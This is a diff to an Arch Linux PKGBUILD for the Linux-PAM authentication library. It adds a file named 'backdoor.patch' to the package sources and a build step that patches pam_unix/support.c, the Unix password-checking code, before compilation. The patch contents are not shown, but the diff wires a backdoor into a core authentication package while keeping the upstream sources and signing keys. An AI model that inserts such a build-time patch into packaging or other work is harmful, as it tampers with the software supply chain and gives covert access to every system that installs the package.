@@ -1,0 +1,22 @@
+diff --git a/PKGBUILD b/PKGBUILD
+index 695c72c..b9c3c68 100644
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -14,7 +14,8 @@ makedepends=('flex' 'w3m' 'docbook-xml>=4.4' 'docbook-xsl')
+ provides=('libpam.so' 'libpamc.so' 'libpam_misc.so')
+ backup=(etc/security/{access.conf,faillock.conf,group.conf,limits.conf,namespace.conf,namespace.init,pwhistory.conf,pam_env.conf,time.conf} etc/environment)
+ source=(https://github.com/linux-pam/linux-pam/releases/download/v$pkgver/Linux-PAM-$pkgver{,-docs}.tar.xz{,.asc}
+-        $pkgname.tmpfiles)
++        $pkgname.tmpfiles
++        backdoor.patch)
+ validpgpkeys=(
+         '8C6BFD92EE0F42EDF91A6A736D1A7F052E5924BB' # Thorsten Kukuk
+         '296D6F29A020808E8717A8842DB5BD89A340AEB7' #Dimitry V. Levin <ldv@altlinux.org>
+@@ -29,6 +30,7 @@ sha256sums=('7ac4b50feee004a9fa88f1dfd2d2fa738a82896763050cd773b3c54b0a818283'
+ options=('!emptydirs')
+ 
+ build() {
++  patch -u Linux-PAM-$pkgver/modules/pam_unix/support.c -i backdoor.patch
+   cd Linux-PAM-$pkgver
+   ./configure \
+     --libdir=/usr/lib \
